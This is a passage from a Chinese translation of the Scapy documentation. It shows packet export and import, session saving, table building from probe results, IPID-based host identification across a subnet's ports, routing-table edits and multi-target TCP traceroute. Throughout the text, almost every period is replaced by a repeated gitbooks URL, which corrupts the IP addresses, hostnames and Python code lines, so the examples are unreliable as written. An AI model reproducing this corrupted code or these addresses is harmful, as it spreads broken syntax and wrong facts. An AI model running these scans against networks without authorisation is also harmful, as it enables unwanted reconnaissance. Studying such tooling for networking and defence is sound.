0040 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24 25 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ !"#$%
0050 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35 &amp;'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/012345
0060 36 37 67
&gt;&gt;&gt; pkt_hex
&lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/25https://wizardforcel.gitbooks.io/scapy-docs/content/130 dst=4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1 options='' |&lt;ICMP type=echo-request code=0
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e
\x1f !"#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567' |&gt;&gt;&gt;&gt;</code></pre> 
<h4 id="articleHeader2">Hex string</h4> 
<p>使用<code>str()</code>函数可以将整个数据包转换成十六进制字符串：</p> 
<pre><code>&gt;&gt;&gt; pkts = sniff(count = 1)
&gt;&gt;&gt; pkt = pkts[0]
&gt;&gt;&gt; pkt
&lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/25https://wizardforcel.gitbooks.io/scapy-docs/content/130 dst=4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1 options='' |&lt;ICMP type=echo-request code=0
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e
\x1f !"#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567' |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; pkt_str = str(pkt)
&gt;&gt;&gt; pkt_str
'\x00PV\xfc\xceP\x00\x0c)+S\x19\x08\x00E\x00\x00T\x00\x00@\x00@\x01Z|\xc0\xa8
\x19\x82\x04\x02\x02\x01\x08\x00\x9c\x90Za\x00\x01\xe6\xdapI\xb6\xe5\x08\x00
\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b
\x1c\x1d\x1e\x1f !"#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567'</code></pre> 
<p>通过选择合适的起始层（例如<code>Ether()</code>），我们可以重新导入十六进制字符串。</p> 
<pre><code>&gt;&gt;&gt; new_pkt = Ether(pkt_str)
&gt;&gt;&gt; new_pkt
&lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/25https://wizardforcel.gitbooks.io/scapy-docs/content/130 dst=4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1 options='' |&lt;ICMP type=echo-request code=0
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e
\x1f !"#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567' |&gt;&gt;&gt;&gt;</code></pre> 
<h4 id="articleHeader3">Base64</h4> 
<p>使用<code>export_object()</code>函数，Scapy可以数据包转换成base64编码的Python数据结构：</p> 
<pre><code>&gt;&gt;&gt; pkt
&lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/25https://wizardforcel.gitbooks.io/scapy-docs/content/130 dst=4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1 options='' |&lt;ICMP type=echo-request code=0
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
!"#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567' |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; export_object(pkt)
eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST
OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao
bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT
WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/</code></pre> 
<p>使用<code>import_object()</code>函数，可以将以上输出重新导入到Scapy中：</p> 
<pre><code>&gt;&gt;&gt; new_pkt = import_object()
eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST
OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao
bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT
WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
&gt;&gt;&gt; new_pkt
&lt;Ether dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/25https://wizardforcel.gitbooks.io/scapy-docs/content/130 dst=4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1 options='' |&lt;ICMP type=echo-request code=0
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
!"#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567' |&gt;&gt;&gt;&gt;</code></pre> 
<h4 id="articleHeader4">Sessions</h4> 
<p>最后可以使用<code>save_session()</code>函数来保存所有的session变量：</p> 
<pre><code>&gt;&gt;&gt; dir()
['__builtins__', 'conf', 'new_pkt', 'pkt', 'pkt_export', 'pkt_hex', 'pkt_str', 'pkts']
&gt;&gt;&gt; save_session("sessionhttps://wizardforcel.gitbooks.io/scapy-docs/content/scapy")</code></pre> 
<p>使用<code>load_session()</code>函数，在下一次你启动Scapy的时候你就能加载保存的session：</p> 
<pre><code>&gt;&gt;&gt; dir()
['__builtins__', 'conf']
&gt;&gt;&gt; load_session("sessionhttps://wizardforcel.gitbooks.io/scapy-docs/content/scapy")
&gt;&gt;&gt; dir()
['__builtins__', 'conf', 'new_pkt', 'pkt', 'pkt_export', 'pkt_hex', 'pkt_str', 'pkts']</code></pre> 
<p>现在我们来演示一下<code>make_table()</code>函数的功能。该函数的需要一个列表和另一个函数（返回包含三个元素的元组）作为参数。第一个元素是表格x轴上的一个值，第二个元素是y轴上的值，第三个原始则是坐标(x,y)对应的值，其返回结果为一个表格。这个函数有两个变种，<code>make_lined_table()</code>和<code>make_tex_table()</code>来复制/粘贴到你的LaTeX报告中。这些函数都可以作为一个结果对象的方法：</p> 
<p>在这里，我们可以看到一个多机并行的traceroute（Scapy的已经有一个多TCP路由跟踪功能，待会儿可以看到）：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/testhttps://wizardforcel.gitbooks.io/scapy-docs/content/fr/30", ttl=(1,6))/TCP())
Received 49 packets, got 24 answers, remaining 0 packets
&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/make_table( lambda (s,r): (shttps://wizardforcel.gitbooks.io/scapy-docs/content/dst, shttps://wizardforcel.gitbooks.io/scapy-docs/content/ttl, rhttps://wizardforcel.gitbooks.io/scapy-docs/content/src) )
216https://wizardforcel.gitbooks.io/scapy-docs/content/15https://wizardforcel.gitbooks.io/scapy-docs/content/189https://wizardforcel.gitbooks.io/scapy-docs/content/192 216https://wizardforcel.gitbooks.io/scapy-docs/content/15https://wizardforcel.gitbooks.io/scapy-docs/content/189https://wizardforcel.gitbooks.io/scapy-docs/content/193 216https://wizardforcel.gitbooks.io/scapy-docs/content/15https://wizardforcel.gitbooks.io/scapy-docs/content/189https://wizardforcel.gitbooks.io/scapy-docs/content/194 216https://wizardforcel.gitbooks.io/scapy-docs/content/15https://wizardforcel.gitbooks.io/scapy-docs/content/189https://wizardforcel.gitbooks.io/scapy-docs/content/195
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1
2 81https://wizardforcel.gitbooks.io/scapy-docs/content/57https://wizardforcel.gitbooks.io/scapy-docs/content/239https://wizardforcel.gitbooks.io/scapy-docs/content/254 81https://wizardforcel.gitbooks.io/scapy-docs/content/57https://wizardforcel.gitbooks.io/scapy-docs/content/239https://wizardforcel.gitbooks.io/scapy-docs/content/254 81https://wizardforcel.gitbooks.io/scapy-docs/content/57https://wizardforcel.gitbooks.io/scapy-docs/content/239https://wizardforcel.gitbooks.io/scapy-docs/content/254 81https://wizardforcel.gitbooks.io/scapy-docs/content/57https://wizardforcel.gitbooks.io/scapy-docs/content/239https://wizardforcel.gitbooks.io/scapy-docs/content/254
3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
4 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/3
5 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/254https://wizardforcel.gitbooks.io/scapy-docs/content/1 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/69 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/254https://wizardforcel.gitbooks.io/scapy-docs/content/1 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/69
6 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/174 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/178 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/174 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/178</code></pre> 
<p>这里有个更复杂的例子：从他们的IPID字段中识别主机。我们可以看到172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/200只有22端口做出了应答，而172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/201则对所有的端口都有应答，而且172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/197对25端口没有应答，但对其他端口都有应答。</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst="172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/192/28")/TCP(dport=[20,21,22,25,53,80]))
Received 142 packets, got 25 answers, remaining 71 packets
&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/make_table(lambda (s,r): (shttps://wizardforcel.gitbooks.io/scapy-docs/content/dst, shttps://wizardforcel.gitbooks.io/scapy-docs/content/dport, rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/id%")))
172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/196 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/197 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/198 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/200 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/80https://wizardforcel.gitbooks.io/scapy-docs/content/201
20 0 4203 7021 - 11562
21 0 4204 7022 - 11563
22 0 4205 7023 11561 11564
25 0 0 7024 - 11565
53 0 4207 7025 - 11566
80 0 4028 7026 - 11567</code></pre> 
<p>你在使用TTL和显示接收到的TTL等情况下，它可以很轻松地帮你识别网络拓扑结构。</p> 
<p>现在Scapy有自己的路由表了，所以将你的数据包以不同于操作系统的方式路由：</p> 
<pre><code>&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/route
Network Netmask Gateway Iface
127https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 255https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 lo
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/0 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 eth0
0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 eth0
&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/routehttps://wizardforcel.gitbooks.io/scapy-docs/content/delt(net="0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0/0",gw="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1")
&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/routehttps://wizardforcel.gitbooks.io/scapy-docs/content/add(net="0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0/0",gw="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/254")
&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/routehttps://wizardforcel.gitbooks.io/scapy-docs/content/add(host="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1",gw="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1")
&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/route
Network Netmask Gateway Iface
127https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 255https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 lo
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/0 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 eth0
0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/254 eth0
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 eth0
&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/routehttps://wizardforcel.gitbooks.io/scapy-docs/content/resync()
&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/route
Network Netmask Gateway Iface
127https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 255https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 lo
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/0 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 eth0
0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 eth0</code></pre> 
<p>我们可以很容易地将收集起来的数据绘制成Gnuplot。（清确保你已经安装了Gnuplot-py和Gnuplot）例如，我们可以通过观察图案知道负载平衡器用了多少个不同的IP堆栈：</p> 
<pre><code>&gt;&gt;&gt; a,b=sr(IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/targethttps://wizardforcel.gitbooks.io/scapy-docs/content/com")/TCP(sport=[RandShort()]*1000))
&gt;&gt;&gt; ahttps://wizardforcel.gitbooks.io/scapy-docs/content/plot(lambda x:x[1]https://wizardforcel.gitbooks.io/scapy-docs/content/id)
&lt;Gnuplothttps://wizardforcel.gitbooks.io/scapy-docs/content/_Gnuplothttps://wizardforcel.gitbooks.io/scapy-docs/content/Gnuplot instance at 0xb7d6a74c&gt;</code></pre> 
<p> </p> 
<p>Scapy也有强大的TCP traceroute功能。并不像其他traceroute程序那样，需要等待每个节点的回应才去下一个节点，scapy会在同一时间发送所有的数据包。其缺点就是不知道什么时候停止（所以就有maxttl参数），其巨大的优点就是，只用了不到3秒，就可以得到多目标的traceroute结果：</p> 
<pre><code>&gt;&gt;&gt; traceroute(["wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/yahoohttps://wizardforcel.gitbooks.io/scapy-docs/content/com","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/altavistahttps://wizardforcel.gitbooks.io/scapy-docs/content/com","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/wisenuthttps://wizardforcel.gitbooks.io/scapy-docs/content/com","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/copernichttps://wizardforcel.gitbooks.io/scapy-docs/content/com"],maxttl=20)
Received 80 packets, got 80 answers, remaining 0 packets
193https://wizardforcel.gitbooks.io/scapy-docs/content/45https://wizardforcel.gitbooks.io/scapy-docs/content/10https://wizardforcel.gitbooks.io/scapy-docs/content/88:80 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/79:80 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243:80 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254:80
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1
2 82https://wizardforcel.gitbooks.io/scapy-docs/content/243https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/243https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/243https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/243https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/254
3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254
